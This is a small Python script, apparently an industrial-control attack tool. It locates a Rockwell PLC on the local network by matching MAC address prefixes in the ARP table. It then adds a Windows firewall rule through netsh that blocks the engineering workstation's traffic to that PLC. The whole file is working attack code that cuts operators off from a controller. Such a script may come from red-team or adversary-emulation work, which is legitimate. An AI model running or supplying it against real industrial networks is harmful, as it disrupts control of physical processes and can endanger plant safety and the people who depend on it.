import re
import subprocess
import scapy.all as scapy

# Rockwell MAC Address Prefixes (Common for Rockwell PLCs)
ROCKWELL_MAC_PREFIXES = ["00:00:BC", "08:00:06", "00:1D:9C"]

def get_plc_ip():
    """Scans the network ARP table to find the PLC's IP address using known Rockwell MAC prefixes."""
    print("[+] Scanning network to find the PLC IP...")
    
    arp_output = subprocess.check_output("arp -a", shell=True).decode()
    arp_lines = arp_output.split("\n")
    
    for line in arp_lines:
        match = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]+)\s+([0-9A-Fa-f:-]+)", line.strip())
        if match:
            ip_address, _, mac_address = match.groups()
            mac_address = mac_address.upper().replace("-", ":")
            for prefix in ROCKWELL_MAC_PREFIXES:
                if mac_address.startswith(prefix):
                    print(f"[+] PLC found! IP Address: {ip_address}")
                    return ip_address
    print("[-] PLC not found. Ensure it is online.")
    return None

def block_plc_messages(plc_ip):
    """Adds a firewall rule to block communication between the PLC and engineering workstation."""
    
    if not plc_ip:
        print("[-] No PLC IP found. Exiting...")
        return

    print(f"[+] Blocking communication to PLC at {plc_ip}...")
    
    # Construct and execute the netsh command to block traffic to PLC
    command = f"netsh advfirewall firewall add rule name=\"Block PLC {plc_ip}\" dir=out action=block remoteip={plc_ip} enable=yes"
    
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Successfully blocked communication to PLC ({plc_ip}).")
    else:
        print(f"[-] Failed to block PLC. Error: {result.stderr}")

def main():
    """Main function to execute the PLC detection and blocking."""
    plc_ip = get_plc_ip()
    block_plc_messages(plc_ip)

if __name__ == "__main__":
    main()